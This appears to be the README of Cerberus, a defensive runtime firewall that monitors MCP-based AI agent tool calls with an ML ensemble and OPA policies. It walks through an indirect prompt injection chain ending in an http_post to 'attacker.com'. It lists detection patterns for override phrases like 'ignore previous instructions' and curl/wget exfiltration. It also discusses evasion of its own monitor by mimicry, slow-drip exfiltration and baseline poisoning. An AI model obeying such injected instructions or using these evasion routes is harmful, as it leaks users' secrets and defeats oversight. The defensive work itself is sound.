# Cerberus 🛡️
### *Runtime Behavioral Firewall & Forensic Zero-Trust Control Plane for MCP-Based AI Agents*

[![CI Build](https://github.com/Debddj/Cerberus/actions/workflows/ci.yml/badge.svg)](https://github.com/Debddj/Cerberus/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/Python-3.12%20%7C%203.14-3776AB.svg?logo=python&logoColor=white)](https://www.python.org/)
[![MCP SDK](https://img.shields.io/badge/MCP%20SDK-v2%20GA-purple.svg?logo=anthropic&logoColor=white)](https://modelcontextprotocol.io/)
[![Policy Engine](https://img.shields.io/badge/Policy-OPA%20Rego%20v1-green.svg?logo=openpolicyagent&logoColor=white)](https://www.openpolicyagent.org/)
[![Frontend](https://img.shields.io/badge/Dashboard-React%2018%20%7C%20Vite%20%7C%20Tailwind-61DAFB.svg?logo=react&logoColor=black)](frontend/)
[![Audit Security](https://img.shields.io/badge/Ledger-SHA--256%20Hash--Chain-orange.svg)](src/cerberus/proxy/logger.py)
[![Code Style](https://img.shields.io/badge/Code%20Style-Ruff%20%7C%20Mypy-000000.svg)](https://github.com/astral-sh/ruff)
[![License](https://img.shields.io/badge/License-Apache--2.0-blue.svg)](LICENSE)

> **"mcp-scan asks: *'Is this tool description safe before I connect?'***  
> **Cerberus asks: *'Does this agent's multi-step sequence trajectory still look like itself over time?'*"**

---

## ⚡ Executive Summary & Benchmark Highlights

The **Model Context Protocol (MCP)** has emerged as the universal connectivity fabric bridging autonomous Large Language Model (LLM) agents with enterprise production systems — file systems, enterprise databases, Git repositories, customer support desks, and external APIs. However, MCP specifies zero runtime behavioral boundaries: **single-event authorization checks cannot distinguish legitimate agent execution from an indirect prompt injection or slow-drip exfiltration kill-chain.**

**Cerberus** is an enterprise-grade, transparent runtime behavioral firewall and security control plane for MCP agents. Operating over both **HTTP JSON-RPC** and **local subprocess Stdio transports**, Cerberus intercepts agent tool calls, scrub sensitive credentials before persistence, continuously scores behavioral drift across a 4-member ensemble (Markov, Isolation Forest, Sequence Transformer, and Rule Floor), enforces dynamic Open Policy Agent (OPA) Rego guardrails, and renders forensic kill-chain narratives in a high-contrast React 18 SOC dashboard.

```
┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                             MEASURED PERFORMANCE SLA                                             │
├──────────────────────────────┬───────────────────────────────┬──────────────────┬────────────────────────────────┤
│ Evaluation Metric            │ Measured Value (95% CI)       │ Industry Target  │ Validation Status              │
├──────────────────────────────┼───────────────────────────────┼──────────────────┼────────────────────────────────┤
│ Standard Attack Detection    │ 100.0% (3/3) [43.9%–100.0%]*  │ > 90.0%          │ ✅ Target Met                  │
│ Adversarial Evasion Catch    │  66.7% (2/3) [20.8%–93.9%]*   │ > 50.0%          │ ✅ Target Met                  │
│ False Positive Rate (FPR)    │   6.25% (25/400) [4.3%–9.1%]  │ < 10.0%          │ ✅ Production Envelope (Data) │
│ P50 Runtime Latency Overhead │  12.26 ms                     │ < 15.0 ms        │ ✅ Real-Time Sub-15ms          │
│ P95 Runtime Latency Overhead │  14.84 ms                     │ < 25.0 ms        │ ✅ Production SLA              │
│ P99 Runtime Latency Overhead │  44.82 ms                     │ < 50.0 ms        │ ✅ Sub-50ms SLA                │
│ Automated Test Suite Pass    │  60 / 60 (100%)               │ 100%             │ ✅ Fully Verified              │
└──────────────────────────────┴───────────────────────────────┴──────────────────┴────────────────────────────────┘
* Note on Sample Size: Preliminary adversarial replay benchmark evaluated n=3 scenarios per attack category.
Confidence intervals represent 95% Wilson score intervals. All 25 false positives occurred in the Data Agent archetype
(25.0% archetype FPR) due to high-variance SQL result payloads; Coding, Support, and Triage archetypes achieved 0.00% FPR.
```

---

## 1. Problem Statement & Threat Landscape

### The Fundamental Blind Spot: Sequence-Level Intent Drift

Existing agent security approaches rely on static pre-connection tool scanning or stateless permission gates. They evaluate every tool call in complete isolation:

$$\text{Evaluate: Is tool } T_i \text{ authorized for Agent } A\text{?}$$

**This formulation completely misses the primary attack surface of autonomous agents.** When an agent is hijacked via **Indirect Prompt Injection** (e.g., hidden payload within a Jira issue, code comment, or customer ticket), each constituent tool invocation is completely valid under role-based access control:

```mermaid
flowchart LR
    subgraph ToxicSequence["The Hidden Threat: Sequence-Level Intent Drift"]
        C1["Call #1: read_public_issue(#42)
        ────────────────────────
        Authorized: Agent routinely
        inspects bug reports."]
        
        C2["Call #2: read_private_repo('.env')
        ────────────────────────
        Authorized: Agent has legitimate
        workspace file access."]
        
        C3["Call #3: http_post('attacker.com')
        ────────────────────────
        Authorized: Agent routinely
        posts outgoing webhooks."]
        
        C1 -->|Legitimate| C2
        C2 -->|Legitimate| C3
    end
    
    Verdict["⚠️ The Attack Exists Exclusively in the Transition Chain!"]
    ToxicSequence -.-> Verdict
```

Every isolated request passes static allowlists. **Cerberus solves this by interposing on the continuous behavioral trajectory $[T_1, T_2, \dots, T_N]$ of each agent session in real time.**

### How Cerberus Outperforms Prior Art

| Security Capability | Static Pre-Flight Scanners (e.g., `mcp-scan`) | Gateway Proxies (e.g., `MCPDome`) | Cerberus Runtime Firewall |
|:---|:---|:---|:---|
| **Inspection Scope** | Pre-connection tool schemas only | Single-event authorization | **Runtime multi-step sequence trajectories** |
| **Detection Paradigm** | Regex & static keyword scanning | Static allowlists / blocklists | **4-Member ML Ensemble + OPA Rego Guardrails** |
| **Context Awareness** | Zero execution context | Tool name + server name | **Shannon entropy, inter-call timing, n-grams, payload byte size** |
| **Transport Support** | N/A (Offline scan) | HTTP only | **Dual Transport: HTTP JSON-RPC Gateway & Local Stdio Subprocess** |
| **Self-Referential Defense**| None | Fail-open default | **Fail-closed OPA circuit breaker + pre-persistence secret redactor** |
| **Explainability** | Allow / Deny | Binary decisions | **Forensic Attack Story Reconstruction (Recon ➔ Staging ➔ Exfil)** |
| **Anti-Poisoning** | None | None | **Immutable Versioned Snapshots + Total Variation Distance (TVD) Gating** |
| **Policy Evolution** | Manual rule authoring | Manual configuration | **Automated Least-Privilege Rego Policy Synthesis with SOC Dry-Run** |
| **Audit Defense** | Flat unencrypted logs | Standard database | **Cryptographic SHA-256 Hash Chain + Fernet At-Rest Encryption** |

---

## 2. System Architecture

Cerberus acts as a transparent, high-speed reverse proxy interposed between client agents (e.g., Claude Desktop, Cursor, Claude Code, custom LangChain/AutoGPT agents) and upstream MCP servers.

```mermaid
flowchart TD
    subgraph ClientSpace["Autonomous Agent Loop"]
        Agent["Autonomous Agent / LLM Client
        (Claude Desktop, Cursor, Custom Agents)"]
    end

    subgraph DualTransport["Cerberus Ingress Layer"]
        HTTPProxy["FastAPI JSON-RPC Gateway
        (POST / & POST /mcp)"]
        StdioProxy["Persistent Stdio Subprocess Proxy
        (ClientSession Wrapper)"]
    end

    subgraph DefensePipeline["Cerberus Multi-Stage Defense Pipeline"]
        Redactor["Pre-Persistence Secret Redactor
        (Regex Scrubbing: OpenAI, AWS, GitHub PATs, RSA)"]

        subgraph PreFlight["Stage 1: Pre-Flight Static Defense"]
            Pinner["Cryptographic Schema Pinner
            (SHA-256 Description & Schema Pinning)"]
            Scope["Scope Analyzer
            (Per-Agent Permitted Tool Vocabularies)"]
            Shadow["Shadow Detector
            (Cross-Server Tool Masquerading Prevention)"]
            Trifecta["Lethal Trifecta Detector
            (Private Read + Untrusted Input + Egress)"]
        end

        subgraph Behavioral["Stage 2: 4-Member Behavioral Ensemble"]
            Features["Feature Extraction Split
            (Categorical vs. Continuous Variables)"]
            RuleFloor["Rule-Based Floor
            (Zero-Day Call #1 Protection)"]
            Markov["Markov Chain Scorer
            (Categorical Transition Surprise)"]
            IF["Isolation Forest Scorer
            (Continuous Multivariate z-Scores)"]
            Transformer["Sequence Transformer
            (Reconstruction Cross-Entropy Loss)"]
            Arbiter["Ensemble Arbiter
            (Circuit Breaker High-Threat Escalation)"]
        end

        subgraph PolicyEngine["Stage 3: Policy Enforcement"]
            OPA["Open Policy Agent (OPA)
            Rego v1 Base & Synthesized Rules"]
            CircuitBreaker["10s Fail-Closed Circuit Breaker
            (Blocks high-risk calls if OPA is offline)"]
        end

        Decision{"Policy Arbiter
        (ALLOW / CHALLENGE / BLOCK / QUARANTINE)"}

        subgraph AuditDefense["Forensics & Tamper-Evident Storage"]
            Ledger["Cryptographic SHA-256 Hash Chain
            H[i] = SHA256(index : H[i-1] : CanonicalJSON(E[i]))"]
            Fernet["Fernet Envelope Encryption at Rest
            (Audit Log Rotation: 10MB x 5 Segments)"]
            Narrator["Forensic Narrative Reconstructor
            (Reconnaissance ➔ Staging ➔ Exfiltration)"]
        end
    end

    subgraph UpstreamEcosystem["Upstream Tool Environment"]
        FS["File System MCP"]
        DB["Database MCP"]
        Web["Webhook / Egress MCP"]
        API["Cloud & REST APIs"]
    end

    subgraph SOCControlPlane["SOC Observability Plane"]
        ReactUI["Enterprise React 18 SOC Dashboard
        (Vite + TailwindCSS + Lucide at /ui)"]
        SSEStream["Live Server-Sent Events (/api/events/stream)"]
        Prometheus["Prometheus Metrics Endpoint (/metrics)"]
    end

    %% Ingress Flow
    Agent -->|HTTP JSON-RPC| HTTPProxy
    Agent -->|Stdio JSON-RPC| StdioProxy

    HTTPProxy --> Redactor
    StdioProxy --> Redactor
    Redactor --> PreFlight
    PreFlight --> Behavioral

    Features --> RuleFloor
    Features --> Markov
    Features --> IF
    Features --> Transformer

    RuleFloor --> Arbiter
    Markov --> Arbiter
    IF --> Arbiter
    Transformer --> Arbiter

    Arbiter --> PolicyEngine
    OPA --> CircuitBreaker
    CircuitBreaker --> Decision

    %% Decision Outcomes
    Decision -->|ALLOW| UpstreamEcosystem
    Decision -->|BLOCK / QUARANTINE| Agent
    Decision --> Ledger
    Ledger --> Fernet

    %% Telemetry & Observability
    Ledger --> Narrator
    Narrator --> ReactUI
    Decision --> SSEStream
    SSEStream --> ReactUI
    Decision --> Prometheus
```

### Millisecond-Scale Interception & Decision Lifecycle (~12–14ms)

```mermaid
sequenceDiagram
    autonumber
    participant A as Autonomous Agent
    participant C as Cerberus Gateway
    participant R as Secret Redactor
    participant S as Static Scanner
    participant B as Behavioral Ensemble
    participant O as OPA Policy Engine
    participant L as Hash-Chain Ledger
    participant U as Upstream MCP Server

    A->>C: tools/call (agent_id, session_id, tool, params)
    activate C
    C->>R: Scrub credentials & compute Shannon entropy
    R-->>C: Sanitized parameters & payload entropy
    
    par Pre-Flight & Behavioral Scoring
        C->>S: Verify Schema Hash, Scope & Lethal Trifecta
        S-->>C: Static risk score & warnings
    and
        C->>B: Evaluate Markov, IF, Transformer & Rule Floor
        B-->>C: Blended ensemble risk score (0.0 - 1.0)
    end

    C->>O: Query Rego policy evaluation (input document)
    alt OPA Reachable
        O-->>C: Decision (ALLOW / CHALLENGE / BLOCK / QUARANTINE)
    else OPA Outage / Unreachable
        C->>C: Trip 10s Fail-Closed Circuit Breaker (Block if Risk >= 0.70)
    end

    C->>L: Append block: H[i] = SHA256(index:prev_hash:CanonicalJSON(event))
    
    alt Decision == ALLOW
        C->>U: Forward tools/call request
        U-->>C: Tool response
        Note over C: ResponseScanner: Scan tool result for indirect prompt injection
        C-->>A: Return validated tool response to Agent
    else Decision == CHALLENGE
        C-->>A: Return JSON-RPC Challenge Envelope (Pending Operator Approval)
    else Decision == BLOCK or QUARANTINE
        C-->>A: Return JSON-RPC Security Error (-32001)
    end
    deactivate C
```

### Human-in-the-Loop Decision Semantics (`CHALLENGE`)

#### Decision Taxonomy & Routing
Cerberus categorizes runtime policy decisions into five explicit states:
- `ALLOW`: Low risk (< 0.40); transparent upstream execution.
- `FLAG`: Moderate risk (0.40 – 0.69); execution permitted with real-time SOC alerting and forensic audit enrichment.
- `CHALLENGE`: High-consequence or moderate-ambiguity operations requiring explicit out-of-band operator confirmation before upstream execution.
- `BLOCK`: High risk (0.70 – 0.89); immediate single-call denial with `-32001` JSON-RPC error.
- `QUARANTINE`: Critical risk ($\ge 0.90$); immediate session termination and agent freeze.

#### Challenge Protocol Lifecycle & Approval Workflow
When policy evaluation yields `CHALLENGE`:
1. **Asynchronous Request Pause**: The proxy suspends the upstream forwarding task and persists a `PendingChallenge` record with a unique `challenge_id` (default TTL: 300 seconds).
2. **Challenge Envelope**: The client or SOC console receives a pending challenge envelope:
   ```json
   {
     "jsonrpc": "2.0",
     "id": "call-10492",
     "result": {
       "status": "challenge_pending",
       "decision": "challenge",
       "challenge_id": "chg_9b8a1c72f4e0",
       "tool_name": "read_private_repo",
       "agent_id": "coding-agent-01",
       "risk_score": 0.58,
       "risk_factors": ["Moderate sequence anomaly", "Access to sensitive workspace path"],
       "expires_at": 1788790200,
       "approval_endpoint": "/api/challenges/chg_9b8a1c72f4e0/resolve"
     }
   }
   ```
3. **Operator Resolution Endpoint**:
   - `POST /api/challenges/{challenge_id}/resolve`
   - Authentication Header: `X-Admin-Token: <token>`
   - Payload:
     ```json
     {
       "action": "approve",
       "operator_id": "secops-dan",
       "reason": "Verified deploy ticket #89"
     }
     ```
4. **Resolution Outcome**:
   - **Approve**: Request resumes, executes upstream, and records `challenge_resolved: approved` in the immutable hash-chain ledger.
   - **Reject / Timeout**: Request aborts immediately, returning `{"error": {"code": -32001, "message": "Challenge rejected by operator"}}`.

### Indirect Prompt Injection Defense (`ResponseScanner` Architecture)

#### Threat Model & Problem Context
Adversaries frequently deliver indirect prompt injection payloads embedded within upstream tool responses (e.g., scraped web content, database records, customer tickets, repository issues). Traditional runtime proxies inspect only outgoing tool request parameters (`tools/call`), passing uninspected upstream outputs directly back to the LLM agent. This leaves downstream reasoning loops vulnerable to context hijacking, instruction overrides, and subsequent lethal trifecta exfiltration.

#### Architecture & Component Interface
The `ResponseScanner` operates as a multi-head inspection pipeline evaluating tool outputs before they reach the agent:

```python
from enum import Enum
from pydantic import BaseModel, Field


class ResponseAction(str, Enum):
    PASS = "pass"
    SANITIZE = "sanitize"
    BLOCK = "block"
    QUARANTINE = "quarantine"


class ResponseScanResult(BaseModel):
    is_safe: bool = True
    action: ResponseAction = ResponseAction.PASS
    risk_score: float = 0.0
    threat_types: list[str] = Field(default_factory=list)
    sanitized_content: str | None = None
    quarantine_session: bool = False
    taints_context: bool = False


class ResponseScanner:
    """Inspects upstream MCP tool call responses before delivery to agent.

    Multi-Head Detection Layers:
    1. Signature & Delimiter Heuristics:
       - Direct instruction overrides ("ignore previous instructions", "system prompt override")
       - Delimiter injections (```system, <instruction>, <system_prompt>, [SYSTEM])
       - Embedded exfiltration commands (curl/wget payloads inside summaries)
    2. Statistical & Entropy Scanners:
       - Suspicious base64 / binary blobs inside expected markdown/text outputs
       - Abnormally high Shannon entropy in text responses
    3. Taint Tracking Integration:
       - Marks active session as TAINTED_WITH_UNTRUSTED_CONTENT
       - Alerts downstream Lethal Trifecta detection if agent subsequently attempts egress
    """

    def __init__(self, risk_threshold: float = 0.70):
        self.risk_threshold = risk_threshold

    async def scan_response(
        self,
        session_id: str,
        agent_id: str,
        tool_name: str,
        response_content: list[dict] | str,
    ) -> ResponseScanResult: ...
```

#### Pipeline Data Flow
```mermaid
flowchart TD
    Upstream["Upstream MCP Server"] -->|Raw Tool Result| Recv["Cerberus Proxy Ingress"]
    Recv --> RS["ResponseScanner"]
    
    subgraph ScanPipeline["ResponseScanner Multi-Head Evaluation"]
        RS --> Sig["1. Delimiter & Override Heuristics"]
        RS --> Ent["2. High-Entropy / Base64 Payload Check"]
        RS --> Taint["3. Lethal Trifecta Taint Gating"]
    end
    
    ScanPipeline --> Decision{"Scan Decision"}
    Decision -->|Safe (Score < 0.40)| Clean["Deliver Raw Result to Agent"]
    Decision -->|Ambiguous (0.40 <= Score < 0.70)| Sanitized["Wrap in <untrusted_content> Warning"]
    Decision -->|Hostile Injection (Score >= 0.70)| Block["Security Error (-32002): Response Blocked"]
    Decision -->|Critical Hijack Attempt (>= 0.90)| Quar["Quarantine Session & Freezes Client"]
```

#### Proxy Integration Points
1. **HTTP JSON-RPC Gateway (`src/cerberus/proxy/server.py`)**: Intercepts `upstream_res` post-forwarding; blocks or sanitizes before returning to client.
2. **Subprocess Stdio Server (`src/cerberus/proxy/stdio_server.py`)**: Intercepts `call_res.content` from upstream child process; substitutes malicious outputs with security warning envelopes.
3. **Forensic Telemetry**: Updates `ToolCallEvent.response_size_bytes`, `response_summary`, and context taint flags in session tracking.

---

## 3. Detection Methodology & Mathematical Formulations

Cerberus relies on a multi-layered mathematical architecture to detect attacks across different temporal scales and feature spaces.

### 1. Markov Chain (Categorical Surprise Signal)
Models tool-to-tool transition probabilities $P(T_i \mid T_{i-1})$ from legitimate historical agent baselines. When an agent transitions between tools with historically low probability, surprise is calculated using log-loss:

$$\text{Surprise}(T_{i-1} \to T_i) = -\log_2 \big( P(T_i \mid T_{i-1}) + \epsilon \big)$$

To prevent outlier explosion from skewing linear ensemble weights, raw surprise is squashed via a tunable logistic sigmoid function:

$$S_{\text{Markov}}(x) = \frac{1}{1 + e^{-0.8(x - 4.0)}}$$

### 2. Isolation Forest (Continuous Multivariate Signal)
To prevent categorical encoding artifacts (e.g., treating arbitrary tool IDs as ordinal numbers), Cerberus's Isolation Forest models exclusively continuous numerical dimensions:
- **Shannon Entropy ($H$)** of parameter values:
  $$H(X) = -\sum_{i=1}^n P(x_i) \log_2 P(x_i)$$
- **Payload Byte Size** of serialized parameters ($\log_{10}(\text{bytes} + 1)$).
- **Inter-Call Latency ($\Delta t$)**: Time elapsed since the previous tool call.
- **Session Duration**: Cumulative active session wall-clock time.
- **Monotonic Sequence Position ($i$)**: Call index within the active session.

Continuous variables are normalized using per-agent robust z-score scaling:

$$Z_k = \frac{x_k - \mu_k}{\sigma_k + \epsilon}$$

### 3. Sequence Neural Transition Model (Deep Sequence Drift)
A zero-dependency, pure NumPy neural next-token transition embedding predictor trained per agent archetype with Mean Squared Error (MSE) loss. It learns continuous embedding representations of expected tool transitions ($T_{i-1} \to T_i$) and flags elevated MSE transition prediction error as deep sequence drift:

$$\mathcal{L}_{\text{MSE}} = \frac{1}{D} \sum_{d=1}^D (e_d - \hat{e}_d)^2$$

### 4. Rule-Based Pre-Baseline Floor
Statistical models require warming periods. To prevent zero-day exploitation during session initialization (Call #1), Cerberus enforces deterministic structural rules:
- **Immediate Egress:** Untrusted data ingestion followed by external egress without intermediate processing.
- **Sensitive Key Exposure:** Accessing `.env`, `.ssh/id_rsa`, or credential vaults.
- **Privilege Escalation:** Invoking administrative functions outside assigned permissions.

### 5. Ensemble Arbiter with High-Threat Circuit Breaker
The ensemble blends signals via weighted linear combination:

$$\text{Score}_{\text{blended}} = w_{\text{rule}} S_{\text{rule}} + w_{\text{markov}} S_{\text{markov}} + w_{\text{if}} S_{\text{if}} + w_{\text{trans}} S_{\text{trans}}$$

*(Default Production Weights: $w_{\text{rule}} = 0.30$, $w_{\text{markov}} = 0.30$, $w_{\text{if}} = 0.20$, $w_{\text{trans}} = 0.20$)*

> [!IMPORTANT]
> **High-Threat Circuit Breaker Escalation:**  
> If $S_{\text{rule}} \ge 0.75$ or $\max(S_{\text{markov}}, S_{\text{if}}, S_{\text{trans}}) \ge 0.90$, the blending arbiter **bypasses linear averaging** and immediately escalates the composite score to $\ge 0.90$. This prevents benign statistical averages from diluting high-confidence exploit signatures.

---

## 4. Enterprise React SOC Dashboard

Cerberus provides an industry-grade Security Operations Center (SOC) dashboard built with **React 18**, **TypeScript**, **Vite**, **TailwindCSS**, and **Lucide React**, served directly from FastAPI at `/ui` and `/dashboard`.

```
┌──────────────────────────────────────────────────────────────────────────────────────────────────┐
│  CERBERUS SOC CONSOLE   [● FAIL-CLOSED ACTIVE]   [MODE: ENFORCE]   [HMAC: SIGNED]   [● LIVE SSE] │
├──────────────────────────────────────────────────────────────────────────────────────────────────┤
│  [⚡ Event Stream]   [🎯 Attack Chains]   [📜 Policies]   [🧬 Baselines]   [🛡️ Audit Ledger]   [📊 Telemetry] │
├──────────────────────────────────────────────────────────────────────────────────────────────────┤
│  LIVE EVENT TRAJECTORY FEED                                                                      │
│  ┌──────────┬──────────────────┬──────────────────────┬────────────┬─────────┬─────────────────┐ │
│  │ TIME     │ AGENT ID         │ TOOL INVOCATION      │ PARAM SIZE │ RISK    │ DECISION        │ │
│  ├──────────┼──────────────────┼──────────────────────┼────────────┼─────────┼─────────────────┤ │
│  │ 19:32:01 │ coding-agent-01  │ read_public_issue    │ 342 B      │ 0.08    │ [ ALLOW ]       │ │
│  │ 19:32:09 │ coding-agent-01  │ read_private_repo    │ 512 B      │ 0.44    │ [ CHALLENGE ]   │ │
│  │ 19:32:25 │ coding-agent-01  │ http_post (exfil)    │ 8.4 KB     │ 0.96    │ [ QUARANTINE ]  │ │
│  └──────────┴──────────────────┴──────────────────────┴────────────┴─────────┴─────────────────┘ │
│                                                                                                  │
│  FORENSIC RECONSTRUCTION: KILL-CHAIN DETECTED                                                    │
│  [PHASE 1: RECON (0.0s)] ──▶ [PHASE 2: STAGING (8.2s)] ──▶ [PHASE 3: EXFILTRATION (24.1s)]      │
│  ⚠️ LETHAL TRIFECTA DETECTED: Untrusted Content + Sensitive Read + External Network Egress      │
└──────────────────────────────────────────────────────────────────────────────────────────────────┘
```

### Dashboard Core Capabilities

1. **⚡ Live Event Stream (`/ui` ➔ Event Stream):**
   - Direct connection to `/api/events/stream` via **Server-Sent Events (SSE)**.
   - Real-time tabular rendering with color-coded status badges (`ALLOW`, `CHALLENGE`, `BLOCK`, `QUARANTINE`).
   - Deep inspection drawer displaying redacted parameters, payload entropy ($H$), destination IP/domain, and isolated model scores.

2. **🎯 Attack Chain Visualizer (`/ui` ➔ Attack Chains):**
   - Automatically clusters suspicious trajectories into MITRE ATT&CK kill-chain stages (**Reconnaissance**, **Data Staging**, **Exfiltration / Privilege Action**).
   - Real-time **Lethal Trifecta** alert banner identifying toxic capability unions.

3. **📜 Policy Manager & Dry-Run Simulator (`/ui` ➔ Policy Manager):**
   - Full viewer for production base Rego policies (`behavioral.rego`, `privilege_escalation.rego`, `rug_pull.rego`, `trifecta.rego`).
   - One-click **Approve & Push to OPA** for auto-synthesized least-privilege policies.
   - Interactive **Dry-Run Workbench**: paste synthetic tool call JSON and verify policy decisions before publishing.

4. **🧬 Baseline & Stability Inspector (`/ui` ➔ Agent Baselines):**
   - Inspect learned tool vocabularies and destination registries per agent archetype.
   - History of immutable versioned snapshots (`snap_v1` $\dots$ `snap_v4`).
   - Total Variation Distance (TVD) stability gate indicator and manual online refit trigger.

5. **🛡️ Cryptographic Audit Ledger (`/ui` ➔ Audit Ledger):**
   - Live validation badge verifying unbroken cryptographic SHA-256 hash-chain integrity.
   - Expandable raw JSON block envelopes displaying parent hash $H_{i-1}$, current hash $H_i$, and payload.

6. **📊 Telemetry & SLA Analytics (`/ui` ➔ Telemetry):**
   - Real-time decision ratio distribution (Allow vs. Challenge vs. Block).
   - 4-Member ensemble weight breakdown and current model contribution gauges.
   - Millisecond latency budget tracker showing compliance against P50 (<15ms) and P99 (<50ms) SLAs (~12–14ms measured).

---

## 5. Meta-Security: Defending Cerberus Itself

A firewall that does not defend itself becomes an organization's most critical single point of failure. Cerberus explicitly addresses three self-referential attack vectors:

```mermaid
flowchart TD
    subgraph MetaSecurity["Cerberus Self-Referential Defense Matrix"]
        A1["Attack Vector 1: OPA Sidecar DoS / Crash
        (Adversary attempts to force fail-open bypass)"]
        M1["Mitigation: Strict Fail-Closed Circuit Breaker
        High-risk calls (>=0.70) and unbaselined sessions
        are unconditionally blocked during outages."]
        A1 ==> M1

        A2["Attack Vector 2: Audit Storage Exfiltration
        (Adversary reads logs containing parameters)"]
        M2["Mitigation: Pre-Persistence Secret Redactor
        API tokens, private keys & passwords are scrubbed
        before disk write; log files encrypted with Fernet."]
        A2 ==> M2

        A3["Attack Vector 3: Boiling-Frog Baseline Poisoning
        (Patient adversary slowly skews normal baseline)"]
        M3["Mitigation: TVD Stability Gating & Versioned Snapshots
        Contaminated sessions (risk >= 0.40) permanently excluded;
        TVD > 0.35 rejects automatic snapshot promotion."]
        A3 ==> M3
    end
```

### 1. Fail-Closed OPA Outage Circuit Breaker
If the OPA daemon becomes unreachable, Cerberus does **not** fail open. An internal 10-second circuit breaker activates:
- Any call with an ensemble risk score $\ge 0.70$ or any static warning is **unconditionally blocked**.
- Unbaselined or cold-start sessions are **quarantined**.
- Only verified, low-risk calls from established sessions are permitted with security logging.

### 2. Cryptographic Tamper-Evident Hash Chain
Every audit event $E_i$ is cryptographically chained to its predecessor:

$$H_i = \text{SHA-256}\Big( \text{index}_i \,:\, H_{i-1} \,:\, \text{CanonicalJSON}(E_i) \Big)$$

Any unauthorized alteration, deletion, or reordering of audit logs on disk immediately breaks the chain and fails CLI verification (`cerberus verify-log`).

### 3. Anti-Boiling-Frog Poisoning Protection
Adversaries often attempt to gradually poison behavioral baselines over weeks. Cerberus prevents this via two mechanisms:
1. **Contamination Quarantine:** Any session containing even one flagged call ($\text{risk} \ge 0.40$) is permanently excluded from baseline retraining sets.
2. **Total Variation Distance (TVD) Stability Gate:** Before promoting a new snapshot (`snap_v(n+1)`), Cerberus computes the TVD between the candidate tool distribution $P$ and historical distribution $Q$:
   $$\delta(P, Q) = \frac{1}{2} \sum_{x \in \mathcal{X}} |P(x) - Q(x)|$$
   If $\delta(P, Q) \gt 0.35$, promotion is aborted and alerted to the SOC.

---

## 6. Empirical Evaluation & Benchmark Results

Cerberus was evaluated against an automated benchmark suite across **4 Real-World Agent Archetypes** (Coding, Data Science, Customer Support, and Web Triage) spanning 400 normal calls and diverse adversarial attacks.

### Scenario Benchmark Scorecard

| Exploit Scenario | Attack Family | Detection Status | Call Caught | Risk Score | Tactical Detection Insight |
|:---|:---|:---|:---|:---|:---|
| **Rug Pull Attack** | Tool Poisoning | ✅ **Detected** | #1 | **0.99** | Intercepted pre-flight via SHA-256 schema pinner before execution. |
| **Toxic Flow** | Prompt Injection | ✅ **Detected** | #3 | **0.95** | Blocked at egress; private data read ➔ outbound post chain identified. |
| **Privilege Escalation**| Identity Abuse | ✅ **Detected** | #1 | **0.90** | Blocked on unscoped administrative tool invocation (`admin_drop_db`). |
| **Slow-Drip Exfiltration**| Temporal Evasion| ⚠️ **Partial** | #10 | **0.75** | Individual calls stayed low-volume; caught at cumulative volume burst. |
| **Markov Mimicry** | Statistical Evasion| ❌ **Missed** | N/A | **0.24** | *Honest finding:* Mimicked legitimate syntax; requires semantic analysis. |
| **Cold-Start Attack** | Session Evasion | ✅ **Detected** | #1 | **0.85** | Pre-baseline rule floor prevented egress before ML models warmed up. |

### Scorer Ablation Study

Demonstrating why the **4-Member Ensemble** is mathematically and empirically necessary over any isolated detector:

| Scoring Architecture | Standard TPR (95% CI) | Evasion TPR (95% CI) | Overall FPR (95% CI) | Primary Operational Characteristic |
|:---|:---:|:---:|:---:|:---|
| **Rule-Based Floor Only** | 66.7% (2/3)<br>[20.8%–93.9%] | 33.3% (1/3)<br>[6.1%–79.2%] | 0.00% (0/400)<br>[0.0%–0.9%] | Zero-day protection from Call #1; rigid thresholds blind to slow-drip & mimicry. |
| **Markov Chain Only** | 66.7% (2/3)<br>[20.8%–93.9%] | 33.3% (1/3)<br>[6.1%–79.2%] | 0.00% (0/400)<br>[0.0%–0.9%] | Sensitive to novel tool transitions; easily defeated by structural Markov mimicry. |
| **Isolation Forest Only** | 66.7% (2/3)<br>[20.8%–93.9%] | 66.7% (2/3)<br>[20.8%–93.9%] | 0.00% (0/400)<br>[0.0%–0.9%] | High sensitivity to continuous entropy & byte size spikes; requires warm baseline. |
| **Sequence Transformer Only** | 100.0% (3/3)<br>[43.9%–100.0%] | 66.7% (2/3)<br>[20.8%–93.9%] | 40.12% (160/400)<br>[35.4%–45.0%] | Deep temporal sequence modeling; high stand-alone false positive rate on diverse baselines. |
| **Cerberus Blended Ensemble** | **100.0% (3/3)**<br>**[43.9%–100.0%]** | **66.7% (2/3)**<br>**[20.8%–93.9%]** | **6.25% (25/400)**<br>**[4.3%–9.1%]** | **Optimal composite balance: suppresses Transformer false positives while maintaining 100% standard TPR.** |

*Note: Evaluation conducted with n=3 scenarios per attack category. Intervals denote Wilson 95% confidence intervals.*

---

## 7. Requirements & Prerequisites

### System Requirements

| Component | Minimum Requirement | Recommended Production |
|:---|:---|:---|
| **Operating System** | Linux (Ubuntu 22.04+), macOS 13+, Windows 10/11 | Linux (Ubuntu 24.04 LTS or Debian 12) |
| **Python Runtime** | Python 3.12 or Python 3.14 | Python 3.12 (via `uv`) |
| **Package Manager** | `pip` or [`uv`](https://github.com/astral-sh/uv) (strongly recommended) | `uv` (v0.5+) |
| **Node.js Runtime** | Node.js 18+ (Only needed to modify frontend source) | Pre-built UI is bundled; Node.js optional |
| **Policy Engine** | Open Policy Agent (OPA) binary (Optional; mocked in tests) | OPA v0.68+ running on `localhost:8181` |
| **Memory / CPU** | 2 CPU Cores, 2 GB RAM | 4 CPU Cores, 4 GB RAM |

---

## 8. Installation & Quickstart

### Step 1: Clone Repository & Setup Virtual Environment

```bash
# Clone Cerberus
git clone https://github.com/Debddj/Cerberus.git
cd Cerberus

# Initialize virtual environment with uv
uv venv
source .venv/bin/activate  # On Windows: .venv\Scripts\activate

# Install Cerberus with all dependencies in editable mode
uv pip install -e ".[dev]"
```

### Step 2: Issue Cryptographic HMAC Agent Tokens

Generate an authentication token for your agent:

```bash
uv run cerberus issue-token --agent-id coding-agent-01 --ttl 3600
```

*Output:*
```
Issued Token for Agent 'coding-agent-01' (TTL: 3600s):
coding-agent-01.1788789123.7f9a2b8c4d1e...
```

### Step 3: Run Cerberus Interception Gateway

Choose between the HTTP Gateway or the Stdio Subprocess Proxy:

#### Option A: Run HTTP JSON-RPC Gateway
```bash
# Start Cerberus HTTP Gateway on port 8000
uv run cerberus http --host 0.0.0.0 --port 8000
```
